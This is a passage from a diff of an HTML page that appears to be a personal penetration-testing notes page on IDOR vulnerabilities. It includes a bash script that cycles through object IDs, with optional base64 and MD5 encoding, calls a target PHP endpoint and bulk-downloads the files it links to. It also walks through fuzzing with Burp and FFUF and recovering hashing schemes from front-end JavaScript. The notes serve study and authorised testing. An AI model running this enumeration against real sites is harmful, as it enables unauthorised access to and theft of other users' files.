ncoded_i=$%28echo%20-n%20$i%20%7c%20base64%20-w%200%20%7c%20md5sum%20%7c%20tr%20-d%20%27%20-%27%29%0a%20%20%20%20%20%20%20%20%20%20%20%20param_value=$encoded_i%0a%20%20%20%20%20%20%20%20else%0a%20%20%20%20%20%20%20%20%20%20%20%20param_value=$i%0a%20%20%20%20%20%20%20%20fi%0a%0a%20%20%20%20%20%20%20%20#%20**HTTP%20Method%20Check%20and%20URL%20Print**%0a%20%20%20%20%20%20%20%20if%20[%20%22$method%22%20==%20%22GET%22%20];%20then%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22GET%20Request:%20$url/$directory.php?$parameter=$param_value%22%0a%20%20%20%20%20%20%20%20%20%20%20%20response=$%28curl%20-s%20%22$url/$directory.php?$parameter=$param_value%22%29%0a%20%20%20%20%20%20%20%20elif%20[%20%22$method%22%20==%20%22POST%22%20];%20then%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22POST%20Request:%20$url/$directory.php%20with%20data:%20$parameter=$param_value%22%0a%20%20%20%20%20%20%20%20%20%20%20%20response=$%28curl%20-s%20-X%20POST%20--data%20%22$parameter=$param_value%22%20%22$url/$directory.php%22%29%0a%20%20%20%20%20%20%20%20else%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22Invalid%20HTTP%20method%20selected.%22%0a%20%20%20%20%20%20%20%20%20%20%20%20exit%201%0a%20%20%20%20%20%20%20%20fi%0a%0a%20%20%20%20%20%20%20%20#%20**Extract%20and%20Download%20Links**%0a%20%20%20%20%20%20%20%20links=$%28echo%20%22$response%22%20%7c%20grep%20-oP%20%22/$directory.*?%5c.%5cw&#43;%22%29%0a%20%20%20%20%20%20%20%20for%20link%20in%20$links;%20do%0a%20%20%20%20%20%20%20%20%20%20%20%20complete_url=%22$%7burl%7d$%7blink%7d%22%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22Downloading:%20$complete_url%22%0a%20%20%20%20%20%20%20%20%20%20%20%20curl%20-s%20-O%20%22$complete_url%22%0a%20%20%20%20%20%20%20%20done%0a%20%20%20%20done%0a%0aelif%20[%20%22$choice%22%20=%20%22F%22%20]%20%7c%7c%20[%20%22$choice%22%20=%20%22f%22%20];%20then%0a%20%20%20%20echo%20%22Enter%20the%20path%20to%20the%20file%20containing%20the%20list:%22%0a%20%20%20%20read%20-e%20-p%20%22%3e%20%22%20listPath%0a%0a%20%20%20%20while%20IFS=%20read%20-r%20line;%20do%0a%20%20%20%20%20%20%20%20i=$line%0a%20%20%20%20%20%20%20%20#%20**Encoding%20Check**%0a%20%20%20%20%20%20%20%20if%20[%20%22$encode%22%20=%20%22Y%22%20]%20%7c%7c%20[%20%22$encode%22%20=%20%22y%22%20];%20then%0a%20%20%20%20%20%20%20%20%20%20%20%20encoded_i=$%28echo%20-n%20$i%20%7c%20base64%20-w%200%20%7c%20md5sum%20%7c%20tr%20-d%20%27%20-%27%29%0a%20%20%20%20%20%20%20%20%20%20%20%20param_value=$encoded_i%0a%20%20%20%20%20%20%20%20else%0a%20%20%20%20%20%20%20%20%20%20%20%20param_value=$i%0a%20%20%20%20%20%20%20%20fi%0a%0a%20%20%20%20%20%20%20%20#%20**HTTP%20Method%20Check%20and%20URL%20Print**%0a%20%20%20%20%20%20%20%20if%20[%20%22$method%22%20==%20%22GET%22%20];%20then%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22GET%20Request:%20$url/$directory.php?$parameter=$param_value%22%0a%20%20%20%20%20%20%20%20%20%20%20%20response=$%28curl%20-s%20%22$url/$directory.php?$parameter=$param_value%22%29%0a%20%20%20%20%20%20%20%20elif%20[%20%22$method%22%20==%20%22POST%22%20];%20then%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22POST%20Request:%20$url/$directory.php%20with%20data:%20$parameter=$param_value%22%0a%20%20%20%20%20%20%20%20%20%20%20%20response=$%28curl%20-s%20-X%20POST%20--data%20%22$parameter=$param_value%22%20%22$url/$directory.php%22%29%0a%20%20%20%20%20%20%20%20else%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22Invalid%20HTTP%20method%20selected.%22%0a%20%20%20%20%20%20%20%20%20%20%20%20exit%201%0a%20%20%20%20%20%20%20%20fi%0a%0a%20%20%20%20%20%20%20%20#%20**Extract%20and%20Download%20Links**%0a%20%20%20%20%20%20%20%20links=$%28echo%20%22$response%22%20%7c%20grep%20-oP%20%22/$directory.*?%5c.%5cw&#43;%22%29%0a%20%20%20%20%20%20%20%20for%20link%20in%20$links;%20do%0a%20%20%20%20%20%20%20%20%20%20%20%20complete_url=%22$%7burl%7d$%7blink%7d%22%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22Downloading:%20$complete_url%22%0a%20%20%20%20%20%20%20%20%20%20%20%20curl%20-s%20-O%20%22$complete_url%22%0a%20%20%20%20%20%20%20%20done%0a%20%20%20%20done%20%3c%20%22$listPath%22%0a%0aelse%0a%20%20%20%20echo%20%22Invalid%20choice.%20Exiting.%22%0a%20%20%20%20exit%201%0afi">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># **Define the base URL**</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Please enter URL you want to test for IDOR&#34;</span>
+</span></span><span style="display:flex;"><span>read url
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># **Select HTTP Method**</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Select HTTP method: GET or POST&#34;</span>
+</span></span><span style="display:flex;"><span>read method
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># **Directory to Search**</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Enter directory to search (e.g., &#39;uploads&#39;, omit the forward slash &#39;/&#39;): &#34;</span>
+</span></span><span style="display:flex;"><span>read directory
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># **Parameter to Fuzz**</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Enter parameter name to fuzz (e.g., &#39;uid&#39;, omit the equals &#39;=&#39;): &#34;</span>
+</span></span><span style="display:flex;"><span>read parameter
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># **Convert Method to Uppercase**</span>
+</span></span><span style="display:flex;"><span>method<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>method^^<span style="color:#e6db74">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># **Range or File List**</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Do you want to use a range (R) or a file list (F)? Enter R or F:&#34;</span>
+</span></span><span style="display:flex;"><span>read choice
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># **Encoding Option**</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Do you want to encode parameter values? (Y/N)&#34;</span>
+</span></span><span style="display:flex;"><span>read encode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$choice<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;R&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$choice<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Enter the start of the range:&#34;</span>
+</span></span><span style="display:flex;"><span>    read start
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Enter the end of the range:&#34;</span>
+</span></span><span style="display:flex;"><span>    read end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq $start $end<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># **Encoding Check**</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$encode<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Y&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$encode<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;y&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>            encoded_i<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n $i | base64 -w <span style="color:#ae81ff">0</span> | md5sum | tr -d <span style="color:#e6db74">&#39; -&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>            param_value<span style="color:#f92672">=</span>$encoded_i
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            param_value<span style="color:#f92672">=</span>$i
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># **HTTP Method Check and URL Print**</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$method<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;GET Request: </span>$url<span style="color:#e6db74">/</span>$directory<span style="color:#e6db74">.php?</span>$parameter<span style="color:#e6db74">=</span>$param_value<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s <span style="color:#e6db74">&#34;</span>$url<span style="color:#e6db74">/</span>$directory<span style="color:#e6db74">.php?</span>$parameter<span style="color:#e6db74">=</span>$param_value<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$method<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;POST Request: </span>$url<span style="color:#e6db74">/</span>$directory<span style="color:#e6db74">.php with data: </span>$parameter<span style="color:#e6db74">=</span>$param_value<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -X POST --data <span style="color:#e6db74">&#34;</span>$parameter<span style="color:#e6db74">=</span>$param_value<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$url<span style="color:#e6db74">/</span>$directory<span style="color:#e6db74">.php&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;Invalid HTTP method selected.&#34;</span>
+</span></span><span style="display:flex;"><span>            exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># **Extract and Download Links**</span>
+</span></span><span style="display:flex;"><span>        links<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;</span>$response<span style="color:#e6db74">&#34;</span> | grep -oP <span style="color:#e6db74">&#34;/</span>$directory<span style="color:#e6db74">.*?\.\w+&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> link in $links; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>            complete_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>url<span style="color:#e6db74">}${</span>link<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;Downloading: </span>$complete_url<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            curl -s -O <span style="color:#e6db74">&#34;</span>$complete_url<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$choice<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;F&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$choice<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;f&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Enter the path to the file containing the list:&#34;</span>
+</span></span><span style="display:flex;"><span>    read -e -p <span style="color:#e6db74">&#34;&gt; &#34;</span> listPath
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span> read -r line; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        i<span style="color:#f92672">=</span>$line
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># **Encoding Check**</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$encode<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Y&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$encode<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;y&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>            encoded_i<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n $i | base64 -w <span style="color:#ae81ff">0</span> | md5sum | tr -d <span style="color:#e6db74">&#39; -&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>            param_value<span style="color:#f92672">=</span>$encoded_i
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            param_value<span style="color:#f92672">=</span>$i
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># **HTTP Method Check and URL Print**</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$method<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;GET Request: </span>$url<span style="color:#e6db74">/</span>$directory<span style="color:#e6db74">.php?</span>$parameter<span style="color:#e6db74">=</span>$param_value<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s <span style="color:#e6db74">&#34;</span>$url<span style="color:#e6db74">/</span>$directory<span style="color:#e6db74">.php?</span>$parameter<span style="color:#e6db74">=</span>$param_value<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$method<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;POST Request: </span>$url<span style="color:#e6db74">/</span>$directory<span style="color:#e6db74">.php with data: </span>$parameter<span style="color:#e6db74">=</span>$param_value<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -X POST --data <span style="color:#e6db74">&#34;</span>$parameter<span style="color:#e6db74">=</span>$param_value<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$url<span style="color:#e6db74">/</span>$directory<span style="color:#e6db74">.php&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;Invalid HTTP method selected.&#34;</span>
+</span></span><span style="display:flex;"><span>            exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># **Extract and Download Links**</span>
+</span></span><span style="display:flex;"><span>        links<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;</span>$response<span style="color:#e6db74">&#34;</span> | grep -oP <span style="color:#e6db74">&#34;/</span>$directory<span style="color:#e6db74">.*?\.\w+&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> link in $links; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>            complete_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>url<span style="color:#e6db74">}${</span>link<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;Downloading: </span>$complete_url<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>            curl -s -O <span style="color:#e6db74">&#34;</span>$complete_url<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">done</span> &lt; <span style="color:#e6db74">&#34;</span>$listPath<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Invalid choice. Exiting.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ol>
+<h3 id="check-url-parameters">Check URL Parameters:</h3>
+<ol>
+<li>
+<p><strong>Study HTTP requests whenever we receive a resource</strong>:</p>
+<ul>
+<li>
+<p>Look for URL paramaters &amp; API&rsquo;s with an object reference:</p>
+<ul>
+<li><del>Example</del>: uid=1</li>
+<li><del>Example</del>: ?filename=file_1.pdf</li>
+</ul>
+<p><del>Note</del>:</p>
+</li>
+<li>
+<p>These are mostly found in URL paramaters &amp; API&rsquo;s but may also be found in other HTTP headers &amp; cookies.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Modify the values to find out if we can retrieve other data</strong>:</p>
+<ul>
+<li><!-- raw HTML omitted -->Manually<!-- raw HTML omitted -->:
+<ol>
+<li><strong>Capture request in Burp</strong>
+<ul>
+<li>Manually incremement the counter.</li>
+<li><del>Example</del>: uid=2</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><!-- raw HTML omitted -->FFUF or Burp<!-- raw HTML omitted -->:
+<ol>
+<li><strong>Capture request in Burp</strong>
+<ul>
+<li>There are lists in seclists for Fuzzing, digits + numbers we can use to modify requests etc.</li>
+<li>We could also create our lists based off of whatever naming convention we find.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="hashing-and-encoding-of-parameters">Hashing &amp; Encoding of parameters:</h3>
+<ul>
+<li>Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead.</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<ol>
+<li><strong>Establish Hashing/Encoding Method Being Used</strong>:
+It&rsquo;s really important we always check if we can de-hash/decode encoded parameters even if they seem secure as they may not be, see source code section below.
+<ol>
+<li><!-- raw HTML omitted -->Using HashID<!-- raw HTML omitted -->:
+<ul>
+<li><code>Command</code>: hashid &lt;hash&gt;
+<del>Example</del>: hashid ZmlsZV8xMjMucGRm</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Using Online Identifier<!-- raw HTML omitted -->:
+<ul>
+<li><a href="https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</a></li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Checking Source Code/Functions/API calls on page<!-- raw HTML omitted -->:
+<ul>
+<li>This is really important as the solution may be staring us right in the face by sitting in functions on the page.</li>
+<li><del>Example</del>: download.php?filename=c81e728d9d4c2f636f067f89cc14862c
+<ul>
+<li>
+<p>At a first glance, we may think that this is a secure object reference however if check the source code on the page we may find a function like below.</p>
+<ul>
+<li>If we look at the below we can actually see that the file is being hashed before the API call is made and it&rsquo;s using the <code>CryptoJS.MD5</code> function so we can then create hashes for other names like <code>file_1.pdf</code> etc and see if we can then use IDOR to exploit.</li>
+</ul>
+<p><del>Example Javascript Function</del>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>             <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;download.php&#34;</span>,
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;post&#34;</span>,
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6e22e">dataType</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;json&#34;</span>,
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">MD5</span>(<span style="color:#e6db74">&#39;file_1.pdf&#39;</span>).<span style="color:#a6e22e">toString</span>()},
+</span></span><span style="display:flex;"><span>                 <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span><span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">result</span>){
+</span></span><span style="display:flex;"><span>                     <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                 }
+</span></span><span style="display:flex;"><span>             });</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="bypassing-encoded-references">Bypassing Encoded References:</h3>
+<ul>
+<li>
+<p>In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible.</p>
+</li>
+<li>
+<p>We can manually check encoded values using online hash checkers as well as burp decoder</p>
+</li>
+<li>
+<p><strong>Example of multi-encoded IDOR Bypass</strong>:</p>
+<ul>
+<li><!-- raw HTML omitted -->Capture Request<!-- raw HTML omitted -->:
+<ul>
+<li>We can see that I am sending a GET request to download a contract:
+<ul>
+<li><figure><img src="/ox-hugo/2024-02-13-065723_.png">
+</figure>
+</li>
+<li>Object Reference: <code>MQ%3D%3D</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Decode<!-- raw HTML omitted -->:
+<ul>
+<li>I decode from URL Encoded which gives me <code>MQ==</code> I then decode this from BASE64:
+<ul>
+<li><code>MQ%3D%3D</code> &ndash;URL&ndash;&gt; <code>MQ==</code> &ndash;BASE64&ndash;&gt; <code>1</code></li>
+<li><figure><img src="/ox-hugo/2024-02-13-070044_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Example of multi-encoded bypass using burp</strong>:</p>
+<ol>
+<li><!-- raw HTML omitted -->Find the vulnerable parameter<!-- raw HTML omitted -->:
+<ul>
+<li><figure><img src="/ox-hugo/2024-02-13-152253_.png">
+</figure>
+</li>
+<li>I discover this is base64 encoded before it&rsquo;s URL encoded.</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->In intruder select correct encoding types<!-- raw HTML omitted -->:
+<ul>
+<li><figure><img src="/ox-hugo/2024-02-13-152410_.png">
+</figure>
+</li>
+<li>We can see that when the encoded paramter is sent it references a specific contract on the backend (as seen in the response) my payload was a simple a numerical cound from 1-20 which was base64 encoded and then url encoded and passed in the GET request.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="idor-bypass-via-function-disclosure">IDOR Bypass via Function Disclosure:</h3>
+<ul>
+<li>
+<p><strong>PHP Functions</strong>:</p>
+<ul>
+<li>Alot of times a <code>download.php</code> file, or equivilant, will be used so objects are not directly referenced.</li>
+<li>If we can read this file via etc we can disclose the process and discover the encoding method being used and then exploit it.</li>
+</ul>
+</li>
+<li>
+<p><strong>Java Script Functions</strong>:</p>
+<ul>
+<li>Modern web applications often use JavaScript frameworks like Angular, React, or Vue.js.</li>
+<li>A common mistake by web developers is performing sensitive functions on the front-end, exposing them to potential attackers.</li>
+<li><del>Example Function</del>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20%20function%20downloadContract%28uid%29%20%7b%0a%20%20%20%20%20%20%20%20$.redirect%28%22/download.php%22,%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20contract:%20CryptoJS.MD5%28btoa%28uid%29%29.toString%28%29,%0a%20%20%20%20%20%20%20%20%7d,%20%22POST%22,%20%22_self%22%29;%0a%20%20%20%20%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">downloadContract</span>(<span style="color:#a6e22e">uid</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/download.php&#34;</span>, {
